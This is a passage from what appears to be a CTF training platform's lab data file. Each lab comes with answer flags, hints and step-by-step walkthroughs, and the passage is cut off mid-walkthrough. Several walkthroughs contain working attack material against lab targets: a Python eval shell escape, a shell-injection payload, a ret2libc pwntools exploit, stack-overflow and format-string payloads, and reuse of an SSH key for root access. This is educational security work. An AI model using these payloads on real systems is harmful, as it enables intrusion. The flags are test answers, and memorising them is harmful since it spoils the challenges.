        content: `# Carving the Embedded File

## Step 1 — Scan for embedded signatures
\`\`\`bash
binwalk evidence.file
\`\`\`
This lists every recognized file signature found inside the blob, along with its byte offset.

## Step 2 — Extract automatically
\`\`\`bash
binwalk -e evidence.file
\`\`\`
This creates an \`_evidence.file.extracted\` directory containing every carved-out file.

## Step 3 — Inspect the carved contents
Open each extracted file. One of them contains a plaintext note with the flag.`,
      },
    ],
  },
  {
    slug: "braille-cipher",
    name: "Braille Cipher",
    category: "FORENSICS",
    difficulty: "INTERMEDIATE",
    labType: "OFFLINE",
    tags: ["Steganography", "Braille Encoding"],
    description: `An image hides an extractable text payload via LSB steganography. Once recovered, the payload turns out to be encoded as six-bit Braille cell patterns rather than plain ASCII.`,
    points: 150,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{braille_bits_decoded}",
    hints: [
      { order: 1, text: "Use an LSB steganography extraction tool against the evidence image to pull out the hidden binary payload first.", pointsPenalty: 15 },
      { order: 2, text: "Standard Braille letters use 6 raised-dot positions per cell — treat each group of 6 bits as one cell and map it against a standard Braille alphabet table.", pointsPenalty: 20 },
    ],
    resources: [
      { name: "vr-evidence-braille-cipher.svg", description: "Evidence image with an LSB-embedded Braille-encoded message", url: "/labs/vr-evidence-braille-cipher.svg" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Decoding LSB Braille Steganography",
        tool: "Manual Analysis",
        order: 1,
        content: `# Decoding LSB Braille Steganography

## Step 1 — Extract the hidden payload
Use any least-significant-bit steganography extraction tool against the evidence image to recover the embedded hex or binary string.

## Step 2 — Segment into Braille cells
Standard Braille letters are encoded with 6 bits (dots 1–6). Special characters like digits and punctuation typically use extended 12-bit patterns. Split your extracted binary stream into 6-bit (or 12-bit, for punctuation/numbers) groups.

## Step 3 — Map to characters
Match each 6-bit group against a standard Braille-to-Latin alphabet mapping table. Decode sequentially.

## Step 4 — Assemble the flag
The decoded characters spell out the flag directly.`,
      },
    ],
  },
  {
    slug: "hex-delta",
    name: "Hex Delta",
    category: "FORENSICS",
    difficulty: "INTERMEDIATE",
    labType: "OFFLINE",
    tags: ["Archive Cracking", "Hex Comparison", "File Diffing"],
    description: `A password-protected archive contains two visually near-identical images. The flag is encoded in the byte-level differences between them.`,
    points: 150,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{hex_diff_finds_the_change}",
    hints: [
      { order: 1, text: "A 4-digit numeric PIN has only 10,000 possibilities — well within reach of a fast offline bruteforce tool.", pointsPenalty: 15 },
      { order: 2, text: "Compare the two extracted images byte-for-byte rather than visually. Concatenate the differing byte values in order.", pointsPenalty: 20 },
    ],
    resources: [
      { name: "hex-delta-archive.zip", description: "PIN-protected archive containing two images", url: "/resources/hex-delta-archive.zip" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Cracking the PIN and Diffing the Images",
        tool: "Command Line",
        order: 1,
        content: `# Cracking the PIN and Diffing the Images

## Step 1 — Bruteforce the archive PIN
\`\`\`bash
zip2john hex-delta-archive.zip > hash.txt
john --mask='%d%d%d%d' hash.txt
\`\`\`
A 4-digit numeric PIN is fast to exhaust exhaustively.

## Step 2 — Extract both images
\`\`\`bash
unzip -P <recovered-pin> hex-delta-archive.zip
\`\`\`

## Step 3 — Compare at the byte level
\`\`\`bash
cmp -l image_a.bin image_b.bin
\`\`\`
This lists every byte offset where the two files differ, along with both byte values (in octal by default — convert to hex or ASCII as needed).

## Step 4 — Assemble the flag
Concatenate the differing bytes in offset order and convert to ASCII — this reconstructs the flag.`,
      },
    ],
  },
  {
    slug: "invisible-script",
    name: "Invisible Script",
    category: "FORENSICS",
    difficulty: "ADVANCED",
    labType: "OFFLINE",
    tags: ["LSB Steganography", "Audio Steganography", "Whitespace Language"],
    description: `A multi-stage puzzle: an image's least-significant bits hide a numeric key. That key unlocks a passphrase-protected audio steganography payload. The extracted payload isn't text at all — it's a program written in an esoteric whitespace-based language.`,
    points: 200,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{whitespace_hides_a_program}",
    hints: [
      { order: 1, text: "Extract the LSB data from the image first — it's a short numeric string, not the flag itself.", pointsPenalty: 15 },
      { order: 2, text: "That numeric string is the steghide passphrase for the audio file. Extract it the same way you would with an image.", pointsPenalty: 20 },
      { order: 3, text: "The extracted file looks empty when printed normally — because it's composed almost entirely of spaces, tabs, and newlines. Run it through a whitespace-language interpreter instead of reading it as text.", pointsPenalty: 25 },
    ],
    resources: [
      { name: "vr-evidence-invisible-script.svg", description: "Evidence image containing an LSB-hidden numeric key", url: "/labs/vr-evidence-invisible-script.svg" },
      { name: "invisible-script-carrier.wav", description: "Audio file with a steghide-protected payload", url: "/resources/invisible-script-carrier.wav" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "The Three-Stage Extraction Chain",
        tool: "Command Line",
        order: 1,
        content: `# The Three-Stage Extraction Chain

## Stage 1 — Recover the numeric key from the image
Use an LSB steganography extraction tool against the evidence image (try bit-plane 1, since that's the convention this lab uses). You'll recover a short numeric string.

## Stage 2 — Use the key as a steghide passphrase
\`\`\`bash
steghide extract -sf invisible-script-carrier.wav -p <recovered-numeric-key>
\`\`\`
This extracts a file that appears completely empty when viewed in a normal text editor.

## Stage 3 — Recognize the whitespace-encoded program
The "empty" file is actually composed of spaces, tabs, and newlines — the full instruction set of an esoteric stack-based language where whitespace characters *are* the program. Run it through any standard interpreter for this language family rather than trying to read it visually.

## Stage 4 — Capture the output
Running the interpreted program prints the flag directly to stdout.`,
      },
    ],
  },
  {
    slug: "alias-prison",
    name: "Alias Prison",
    category: "LINUX",
    difficulty: "BEGINNER",
    labType: "OFFLINE",
    tags: ["Shell", "Bash Aliases", "Sandbox Escape"],
    description: `A restricted shell environment redefines every common file-reading command as a harmless alias. The underlying binaries are untouched — only their names have been shadowed.`,
    points: 100,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{aliases_are_not_a_jail}",
    hints: [
      { order: 1, text: "Aliases only shadow a command name — the real binary is still reachable by its full path, or by temporarily unaliasing the shadowed name.", pointsPenalty: 15 },
    ],
    resources: [
      { name: "alias-prison-connect.txt", description: "Connection details for the restricted shell", url: "/resources/alias-prison-connect.txt" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Bypassing Shadowed Commands",
        tool: "Shell",
        order: 1,
        content: `# Bypassing Shadowed Commands

## Step 1 — Confirm the shadowing
Running \`cat flag.txt\` produces a joke response instead of the file contents — \`cat\` has been aliased to something harmless.

## Step 2 — Bypass via full path
Most standard tools live in predictable locations:
\`\`\`bash
/bin/cat flag.txt
\`\`\`

## Step 3 — Or unalias directly
If the shell allows it:
\`\`\`bash
unalias cat
cat flag.txt
\`\`\`

Either approach bypasses the shadowed alias and reveals the flag.`,
      },
    ],
  },
  {
    slug: "deep-grep",
    name: "Deep Grep",
    category: "LINUX",
    difficulty: "BEGINNER",
    labType: "OFFLINE",
    tags: ["Shell", "grep", "diff", "File Hunting"],
    description: `A multi-user SSH environment scatters thousands of near-identical text files across a home directory. Exactly one of them differs from all the others — and it holds the flag.`,
    points: 100,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{diff_finds_the_needle}",
    hints: [
      { order: 1, text: "Start with a broad recursive `grep` for the flag prefix across every file you can reach — sometimes credentials for the next stage are hiding in plain sight.", pointsPenalty: 15 },
      { order: 2, text: "Once you're in a directory full of near-identical files, `diff` between any two of them will show you nothing interesting — unless you compare against the *one* file that's actually different.", pointsPenalty: 20 },
    ],
    resources: [
      { name: "deep-grep-connect.txt", description: "SSH connection details", url: "/resources/deep-grep-connect.txt" },
    ],
    isFeatured: true,
    walkthroughs: [
      {
        title: "Hunting the Odd File Out",
        tool: "Shell",
        order: 1,
        content: `# Hunting the Odd File Out

## Step 1 — Connect and orient yourself
\`\`\`bash
ssh <user>@<lab-host> -p <port>
\`\`\`

## Step 2 — Recursive search for known patterns
\`\`\`bash
grep -irs "VR{" .
\`\`\`
This may surface a decoy or a credential for a second user account rather than the real flag immediately.

## Step 3 — Escalate if needed
If credentials for another account are found, switch users:
\`\`\`bash
su <second-user>
\`\`\`

## Step 4 — Diff against the pack
In a directory full of thousands of near-identical files, compare pairs systematically:
\`\`\`bash
for f in file_*.txt; do diff -q template.txt "$f"; done
\`\`\`
The one file reported as different from the rest is the one holding the flag.`,
      },
    ],
  },
  {
    slug: "chroot-breach",
    name: "Chroot Breach",
    category: "LINUX",
    difficulty: "INTERMEDIATE",
    labType: "OFFLINE",
    tags: ["Linux", "chroot", "SSH Keys"],
    description: `A restricted shell drops connecting users into a chroot jail — a filesystem sandbox that limits visible files, but doesn't restrict outbound network connections or reused SSH credentials sitting inside the jail itself.`,
    points: 150,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{chroot_keys_escape_the_root}",
    hints: [
      { order: 1, text: "Explore the jailed filesystem for anything under a `.ssh` directory — key material doesn't stop being useful just because it's inside a chroot.", pointsPenalty: 20 },
      { order: 2, text: "A chroot restricts the filesystem view, not outbound network access. If you find a private key, what happens if you SSH back into the same host as a different, unrestricted user?", pointsPenalty: 25 },
    ],
    resources: [
      { name: "chroot-breach-connect.txt", description: "Connection details for the jailed shell", url: "/resources/chroot-breach-connect.txt" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Escaping the Chroot via Reused SSH Keys",
        tool: "Shell",
        order: 1,
        content: `# Escaping the Chroot via Reused SSH Keys

## Step 1 — Connect and look around
\`\`\`bash
ssh <user>@<lab-host> -p <port>
\`\`\`
You land in a shell with a visibly restricted filesystem — a classic chroot jail.

## Step 2 — Search for leftover credentials
\`\`\`bash
find / -name "*.pem" -o -name "id_rsa*" 2>/dev/null
\`\`\`
A private key pair is present inside the jail, apparently forgotten during setup.

## Step 3 — Use the key to connect outside the jail
\`\`\`bash
ssh -i /path/to/id_rsa -o StrictHostKeyChecking=no root@localhost
\`\`\`
Because chroot restricts the filesystem view but not network access, this new SSH session authenticates against the *host's* SSH daemon rather than staying trapped in the jail.

## Step 4 — Retrieve the flag
Once connected as the privileged account, the flag is directly readable.`,
      },
    ],
  },
  {
    slug: "eval-escape",
    name: "Eval Escape",
    category: "MISC",
    difficulty: "INTERMEDIATE",
    labType: "OFFLINE",
    tags: ["Python", "Sandbox Escape", "eval()"],
    description: `A remote service exposes a Python expression evaluator intended only for basic arithmetic and cipher helper functions. It places no real restriction on what \`eval()\` is allowed to execute.`,
    points: 150,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{eval_sandbox_has_no_walls}",
    hints: [
      { order: 1, text: "If the service accepts arbitrary Python expressions via `eval()`, you're not limited to the documented helper functions — any built-in or importable module is fair game.", pointsPenalty: 20 },
      { order: 2, text: "`__import__('os').system('sh')` is a classic way to spawn an interactive shell from inside a Python `eval()` sandbox with no restrictions.", pointsPenalty: 25 },
    ],
    resources: [
      { name: "eval-escape-connect.txt", description: "Connection details for the exposed evaluator", url: "/resources/eval-escape-connect.txt" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Breaking Out of the Evaluator",
        tool: "Python / netcat",
        order: 1,
        content: `# Breaking Out of the Evaluator

## Step 1 — Connect to the service
\`\`\`bash
nc <lab-host> <port>
\`\`\`
You're presented with a menu of "supported" cipher functions and told to type Python expressions to invoke them.

## Step 2 — Confirm unrestricted eval()
Try a basic non-cipher expression:
\`\`\`python
__import__('os').getcwd()
\`\`\`
If this returns a real path instead of an error, the evaluator has no sandboxing whatsoever.

## Step 3 — Spawn a shell
\`\`\`python
__import__('os').system('sh')
\`\`\`

## Step 4 — Explore and retrieve the flag
With a real shell, explore the filesystem for the flag file, or check version-control history if a \`.git\` directory is present — sensitive files are sometimes removed in a later commit but still exist in history.`,
      },
    ],
  },
  {
    slug: "voice-inject",
    name: "Voice Inject",
    category: "MISC",
    difficulty: "BEGINNER",
    labType: "OFFLINE",
    tags: ["Shell Injection", "Bot Automation"],
    description: `A text-to-speech bot converts submitted text into an audio file by writing it into a shell script and executing it. The text is never sanitized before being embedded in the script.`,
    points: 100,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{shell_metacharacters_speak}",
    hints: [
      { order: 1, text: "If your submitted text gets written verbatim inside a shell script's `echo '...'` line, closing the quote early lets you append your own command before the line continues.", pointsPenalty: 15 },
    ],
    resources: [
      { name: "voice-inject-connect.txt", description: "Connection details for the bot interface", url: "/resources/voice-inject-connect.txt" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Injecting Shell Commands via Bot Input",
        tool: "Manual Analysis",
        order: 1,
        content: `# Injecting Shell Commands via Bot Input

## Step 1 — Understand the pipeline
The bot takes your submitted text, writes it into a generated shell script as \`echo '<your text>'\`, then executes that script and returns the resulting audio.

## Step 2 — Craft a breakout payload
Because your input lands directly inside a single-quoted string, closing the quote early lets you inject arbitrary shell syntax:
\`\`\`
'; cat flag.txt; echo '
\`\`\`

## Step 3 — Submit and listen
The bot returns synthesized audio of whatever the script printed — including the flag file's contents, spoken aloud (or embedded as text if the bot also echoes a transcript).`,
      },
    ],
  },
  {
    slug: "overflow-zero",
    name: "Overflow Zero",
    category: "PWN",
    difficulty: "BEGINNER",
    labType: "OFFLINE",
    tags: ["Buffer Overflow", "Stack Corruption", "gets()"],
    description: `A small C program reads user input into a fixed-size stack buffer using an inherently unsafe input function, with no bounds checking. An adjacent integer flag variable sits just beyond the buffer.`,
    points: 120,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{adjacent_var_overwritten}",
    hints: [
      { order: 1, text: "Disassemble the binary and note the stack layout — how many bytes separate the character buffer from the adjacent integer variable?", pointsPenalty: 15 },
      { order: 2, text: "You don't need a precise value in the overflow — any non-zero garbage landing in the adjacent integer is enough to satisfy a `!= 0` check.", pointsPenalty: 15 },
    ],
    resources: [
      { name: "overflow-zero-binary", description: "Vulnerable ELF binary and matching source", url: "/resources/overflow-zero-binary" },
    ],
    isFeatured: true,
    walkthroughs: [
      {
        title: "Overflowing an Adjacent Stack Variable",
        tool: "GDB / Python",
        order: 1,
        content: `# Overflowing an Adjacent Stack Variable

## Step 1 — Analyze the stack layout
\`\`\`bash
objdump -d overflow-zero | less
\`\`\`
Locate the function prologue and identify how the compiler laid out the local buffer and the adjacent integer variable relative to the stack frame.

## Step 2 — Determine the required overflow length
The two variables sit at a fixed, computable offset from each other based on the buffer size and the nearest 16-byte stack alignment.

## Step 3 — Trigger the overflow
\`\`\`bash
python3 -c "print('a' * 48)" | ./overflow-zero
\`\`\`
Filling the entire local stack frame with non-zero bytes corrupts the adjacent flag variable away from zero, satisfying the program's later conditional check and triggering the flag-printing branch.`,
      },
    ],
  },
  {
    slug: "overflow-one",
    name: "Overflow One",
    category: "PWN",
    difficulty: "BEGINNER",
    labType: "OFFLINE",
    tags: ["Buffer Overflow", "Precise Overwrite", "Little Endian"],
    description: `A variant of the classic stack buffer overflow — this time the program checks the overwritten integer against a specific hex constant, requiring a precisely crafted payload rather than arbitrary garbage.`,
    points: 120,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{precise_overflow_lands_value}",
    hints: [
      { order: 1, text: "Pad up to the exact byte offset of the target variable, then append the required 4-byte value in little-endian order.", pointsPenalty: 20 },
    ],
    resources: [
      { name: "overflow-one-binary", description: "Vulnerable ELF binary and matching source", url: "/resources/overflow-one-binary" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Precisely Overwriting a Checked Value",
        tool: "Python",
        order: 1,
        content: `# Precisely Overwriting a Checked Value

## Step 1 — Find the required constant
Disassemble the binary and locate the comparison instruction that gates the flag-printing branch — it compares the target variable against a specific 4-byte hex constant.

## Step 2 — Determine the padding length
Using GDB or objdump, confirm exactly how many bytes separate the start of the buffer from the target variable.

## Step 3 — Craft the payload
\`\`\`python
import struct
padding = b'a' * 44
target_value = struct.pack('<I', 0xcafebabe)  # little-endian
payload = padding + target_value
\`\`\`

## Step 4 — Deliver it
\`\`\`bash
python3 -c "
import struct
print((b'a'*44 + struct.pack('<I', 0xcafebabe)).decode('latin-1'))
" | ./overflow-one
\`\`\`
The program's check now passes and the flag prints.`,
      },
    ],
  },
  {
    slug: "return-jump",
    name: "Return Jump",
    category: "PWN",
    difficulty: "INTERMEDIATE",
    labType: "OFFLINE",
    tags: ["Buffer Overflow", "Return Address Overwrite", "Control Flow Hijack"],
    description: `A vulnerable function reads unbounded input onto the stack with no protection against overwriting its own saved return address — and a separate, never-called function sits elsewhere in the binary, ready to print the flag if execution ever reaches it.`,
    points: 150,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{saved_rip_redirected}",
    hints: [
      { order: 1, text: "Find the address of the function that prints the flag — it's compiled into the binary but never called from `main()`. `objdump -d` or GDB will show you its address.", pointsPenalty: 20 },
      { order: 2, text: "Fill the buffer, then overwrite the saved base pointer, then overwrite the saved return address with your target function's address in little-endian bytes.", pointsPenalty: 25 },
    ],
    resources: [
      { name: "return-jump-binary", description: "Vulnerable ELF binary and matching source", url: "/resources/return-jump-binary" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Hijacking the Return Address",
        tool: "GDB / Python",
        order: 1,
        content: `# Hijacking the Return Address

## Step 1 — Find the target function's address
\`\`\`bash
objdump -d return-jump | grep '<flag_function>:'
\`\`\`
Note the address — this function exists in the binary but is never referenced by \`main()\`.

## Step 2 — Determine the offset to the saved return address
The stack layout is: \`[buffer][saved rbp][saved return address]\`. Determine the buffer size and add 8 bytes for the saved base pointer to find the exact offset where the return address begins.

## Step 3 — Build the payload
\`\`\`python
import struct
payload = b'a' * 32          # fill the buffer
payload += b'b' * 8          # overwrite saved rbp
payload += struct.pack('<Q', 0x4011ce)  # overwrite return address (example)
\`\`\`

## Step 4 — Deliver and observe
\`\`\`bash
python3 -c "
import struct
import sys
sys.stdout.buffer.write(b'a'*32 + b'b'*8 + struct.pack('<Q', 0x4011ce))
" | ./return-jump
\`\`\`
Execution returns into the target function instead of back to \`main()\`, printing the flag.`,
      },
    ],
  },
  {
    slug: "format-string",
    name: "Format String",
    category: "PWN",
    difficulty: "ADVANCED",
    labType: "OFFLINE",
    tags: ["Format String Vulnerability", "Arbitrary Write", "printf"],
    description: `A login function passes user-controlled input directly as the format string to \`printf()\` rather than as an argument. This lets an attacker both read stack memory and write arbitrary values to arbitrary addresses using \`%x\` and \`%n\` directives.`,
    points: 200,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{printf_writes_to_memory}",
    hints: [
      { order: 1, text: "`%x` leaks stack values in hex, one per format specifier. `%N$x` lets you target a specific stack position directly by index.", pointsPenalty: 20 },
      { order: 2, text: "`%n` writes the number of bytes printed so far to the address referenced by the corresponding stack argument — combine this with a controlled character count to write a precise value.", pointsPenalty: 30 },
    ],
    resources: [
      { name: "format-string-binary", description: "Vulnerable ELF binary and matching source", url: "/resources/format-string-binary" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Writing Arbitrary Memory via Format String",
        tool: "GDB / Python",
        order: 1,
        content: `# Writing Arbitrary Memory via Format String

## Step 1 — Find the target global variable's address
\`\`\`bash
objdump -t format-string | grep admin
\`\`\`

## Step 2 — Determine the stack position of your input
Send a marker payload with a series of \`%x\` specifiers to find which position on the stack corresponds to the start of your controlled input:
\`\`\`bash
python3 -c "print('AAAA' + '%x '*20)" | ./format-string
\`\`\`
Find the position where \`41414141\` (hex for "AAAA") appears — that's your controlled offset.

## Step 3 — Place the target address on the stack
Prepend the target global variable's address as raw bytes at the start of your input, so it lands at a known, referenceable stack position.

## Step 4 — Use %n to write
Combine a width specifier with \`%n\` to write a specific value:
\`\`\`
<4-byte-address><padding-to-hit-desired-value>%OFFSET$n
\`\`\`
Because writing a full 4-byte value directly is impractical for large numbers, split the write into two 2-byte writes (low half, then high half) using two separate \`%n\` writes at adjacent addresses.

## Step 5 — Verify and capture
Once the target variable holds the required value, the program's conditional check passes and the flag prints.`,
      },
    ],
  },
  {
    slug: "stack-flood",
    name: "Stack Flood",
    category: "PWN",
    difficulty: "BEGINNER",
    labType: "OFFLINE",
    tags: ["Buffer Overflow", "strcat", "Implicit Overflow"],
    description: `A program concatenates user input onto a fixed-size buffer using an unsafe string function with no length checking. The buffer holding the flag sits directly adjacent in memory.`,
    points: 120,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{strcat_floods_the_stack}",
    hints: [
      { order: 1, text: "`strcat()` has no concept of destination buffer size. If the flag buffer is allocated right before the input buffer on the stack, flooding the input is enough to spill into and print adjacent memory.", pointsPenalty: 15 },
    ],
    resources: [
      { name: "stack-flood-binary", description: "Vulnerable ELF binary and matching source", url: "/resources/stack-flood-binary" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Flooding the Stack to Leak an Adjacent Buffer",
        tool: "Python / netcat",
        order: 1,
        content: `# Flooding the Stack to Leak an Adjacent Buffer

## Step 1 — Identify the vulnerable concatenation
The binary reads a "secret phrase" from the user and appends it with \`strcat()\` onto a buffer that sits directly after a flag buffer in the stack layout.

## Step 2 — Flood with a large payload
\`\`\`bash
python3 -c "print('a' * 1000)" | ./stack-flood
\`\`\`

## Step 3 — Observe the output
Because \`strcat()\` performs no bounds checking, flooding the destination buffer with far more data than it can hold overflows into and eventually prints the adjacent flag buffer's contents as part of the program's own output routine.`,
      },
    ],
  },
  {
    slug: "smash-stack",
    name: "Smash Stack",
    category: "PWN",
    difficulty: "INTERMEDIATE",
    labType: "OFFLINE",
    tags: ["Buffer Overflow", "ret2libc", "strcpy"],
    description: `A program copies unbounded user input into a fixed stack buffer using \`strcpy()\`, then prints it back unescaped. Overflowing the buffer lets an attacker overwrite the return address and redirect execution into a libc function to spawn a shell.`,
    points: 150,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{ret2libc_spawns_a_shell}",
    hints: [
      { order: 1, text: "This binary was compiled with `-fno-stack-protector -no-pie`, meaning no stack canary and a fixed, predictable memory layout — ideal conditions for a classic ret2libc chain.", pointsPenalty: 20 },
      { order: 2, text: "Find the offset to the saved return address, then chain a call to `system(\"/bin/sh\")` using known libc function addresses and a `/bin/sh` string already present in the binary or libc.", pointsPenalty: 30 },
    ],
    resources: [
      { name: "smash-stack-binary", description: "Vulnerable ELF binary compiled without stack protection", url: "/resources/smash-stack-binary" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Building a ret2libc Exploit",
        tool: "pwntools",
        order: 1,
        content: `# Building a ret2libc Exploit

## Step 1 — Confirm the binary's protections
\`\`\`bash
checksec --file=smash-stack
\`\`\`
Expect no stack canary, no PIE — a fixed, predictable binary layout.

## Step 2 — Find the offset to the return address
Use a cyclic pattern to determine the exact overflow offset:
\`\`\`python
from pwn import cyclic, cyclic_find
payload = cyclic(200)
# crash the binary, inspect the value in the saved-return-address slot with GDB,
# then: offset = cyclic_find(<value from crash>)
\`\`\`

## Step 3 — Locate \`system()\` and a \`/bin/sh\` string
\`\`\`bash
objdump -d smash-stack | grep 'system@plt'
strings -a smash-stack | grep '/bin/sh'
\`\`\`
If no \`/bin/sh\` string exists in the binary itself, locate one inside libc instead.

## Step 4 — Build and send the payload
\`\`\`python
from pwn import *

p = process('./smash-stack')
offset = 140  # example, use your measured offset
system_addr = 0x08049030  # example PLT address
binsh_addr = 0x080be408   # example string address

payload = b'A' * offset
payload += p32(system_addr)
payload += b'JUNK'         # fake return address after system() returns
payload += p32(binsh_addr)

p.sendline(payload)
p.interactive()
\`\`\`

## Step 5 — Capture the flag
With a shell spawned, list the working directory and read the flag file directly.`,
      },
    ],
  },
  {
    slug: "pascal-decoder",
    name: "Pascal Decoder",
    category: "REVERSING",
    difficulty: "INTERMEDIATE",
    labType: "OFFLINE",
    tags: ["Reverse Engineering", "Combinatorics", "Automation"],
    description: `A binary displays a random integer, then repeatedly asks for values that must match a specific combinatorial formula applied against that integer. Reverse the validation logic and automate the correct responses.`,
    points: 150,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{combinatorics_automated}",
    hints: [
      { order: 1, text: "Decompile the binary and trace what mathematical relationship the `process()` function is checking your input against — it involves a combination-count style formula.", pointsPenalty: 20 },
      { order: 2, text: "Once you recognize the formula, write a small script that connects to the service, reads the displayed number, computes every required response, and sends them back automatically.", pointsPenalty: 20 },
    ],
    resources: [
      { name: "pascal-decoder-binary", description: "Compiled challenge binary", url: "/resources/pascal-decoder-binary" },
    ],
    isFeatured: true,
    walkthroughs: [
      {
        title: "Reversing and Automating the Validator",
        tool: "Ghidra / Python",
        order: 1,
        content: `# Reversing and Automating the Validator

## Step 1 — Decompile
Open the binary in a decompiler and locate the main validation loop. You'll find it displays a random integer \`n\` (within a fixed range) and then repeatedly requests \`n+1\` values.

## Step 2 — Identify the formula
Tracing the comparison function reveals it computes a binomial-coefficient-style value — the number of ways to choose \`r\` items from \`n\`, for each \`r\` from \`0\` to \`n\` — and compares it against your submitted value.

## Step 3 — Automate the response
\`\`\`python
from pwn import remote

def factorial(k):
    result = 1
    for i in range(2, k + 1):
        result *= i
    return result

def choose(n, r):
    return factorial(n) // (factorial(r) * factorial(n - r))

conn = remote('<lab-host>', <port>)
n = int(conn.recvline().strip())

for r in range(n + 1):
    conn.sendline(str(choose(n, r)).encode())

print(conn.recvall().decode())
\`\`\`

## Step 4 — Capture the flag
Once every required value matches, the program prints the flag.`,
      },
    ],
  },
  {
    slug: "multi-layer",
    name: "Multi Layer",
    category: "REVERSING",
    difficulty: "ADVANCED",
    labType: "OFFLINE",
    tags: ["Reverse Engineering", "Compound Cipher", "Substitution"],
    description: `A short encryption script chains a randomized Caesar shift, an XOR keystream, and two separate fixed-permutation transpositions before printing the result. The randomization is bounded and reversible once you understand the chain.`,
    points: 200,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{compound_cipher_unwound}",
    hints: [
      { order: 1, text: "Work backward through the encryption steps in reverse order. Each transposition is a fixed, known permutation — reversing it is a matter of inverting the index mapping.", pointsPenalty: 25 },
      { order: 2, text: "The Caesar shift in this script is really just a per-character rotation with a random amount — because it's bounded to 25 possible shifts, you can brute-force every rotation of a candidate string and look for one that reads as English.", pointsPenalty: 25 },
    ],
    resources: [
      { name: "multi-layer-source.py", description: "The original encryption script", url: "/resources/multi-layer-source.py" },
      { name: "multi-layer-output.txt", description: "Encrypted key and flag output", url: "/resources/multi-layer-output.txt" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Unwinding the Compound Cipher",
        tool: "Python",
        order: 1,
        content: `# Unwinding the Compound Cipher

## Step 1 — Read the source, understand the chain
The encryption applies transformations in this order: random Caesar shift → XOR with a repeating key → fixed transposition #1 → fixed transposition #2, applied to both the key and the flag with an extra shift layer for the key alone.

## Step 2 — Reverse the transpositions first
Both transposition functions use fixed, known index-mapping tables. Write inverse functions that place each character back at its original index using the same mapping table in reverse.

## Step 3 — Recover the key
Because the transposition mappings are known and fixed, un-transposing the encrypted key reveals a small set of Caesar-shift candidates (one per possible random shift value, since the shift amount wasn't transmitted). Brute-force all 25 non-zero shifts and look for a candidate that reads as coherent English — this is your XOR key.

## Step 4 — Decrypt the flag
With the recovered key, reverse the transpositions on the encrypted flag, undo the XOR using the known key, and finally brute-force the final Caesar shift (again, trying all 25 rotations) until the plaintext reads \`VR{...}\`.`,
      },
    ],
  },
  {
    slug: "bytecode-maze",
    name: "Bytecode Maze",
    category: "REVERSING",
    difficulty: "ADVANCED",
    labType: "OFFLINE",
    tags: ["Python Bytecode", "Disassembly", "Reverse Engineering"],
    description: `Two small helper functions were compiled and their bytecode disassembly captured — but the original Python source is gone. Reconstruct what each function does purely from its disassembly, then reverse the resulting encoding chain to recover a hidden flag.`,
    points: 200,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{disassembly_reveals_logic}",
    hints: [
      { order: 1, text: "Read the disassembly instruction by instruction, translating each opcode back into equivalent Python source — `LOAD_FAST`, `BINARY_MULTIPLY`, `CALL_FUNCTION` etc. map directly onto familiar expressions.", pointsPenalty: 25 },
      { order: 2, text: "One function builds an output string by repeatedly counting character occurrences and appending computed values; the other applies a per-character XOR keystream. Once reconstructed in Python, write inverse functions for both.", pointsPenalty: 25 },
    ],
    resources: [
      { name: "bytecode-maze-func1.txt", description: "Disassembly of the first encoding function", url: "/resources/bytecode-maze-func1.txt" },
      { name: "bytecode-maze-func2.txt", description: "Disassembly of the second encoding function", url: "/resources/bytecode-maze-func2.txt" },
      { name: "bytecode-maze-encoded.txt", description: "The encoded flag output", url: "/resources/bytecode-maze-encoded.txt" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Reconstructing Source from Bytecode",
        tool: "Manual Analysis / Python",
        order: 1,
        content: `# Reconstructing Source from Bytecode

## Step 1 — Translate the first function
Reading the disassembly opcode by opcode (\`LOAD_GLOBAL\`, \`LOAD_METHOD count\`, \`CALL_METHOD\`, arithmetic ops, \`INPLACE_ADD\`) reconstructs into Python roughly as:

\`\`\`python
def func1(text):
    ret_text = ''
    for i in list(text):
        counter = text.count(i)
        ret_text += chr(2 * ord(i) - len(text))
    return ret_text
\`\`\`

## Step 2 — Translate the second function
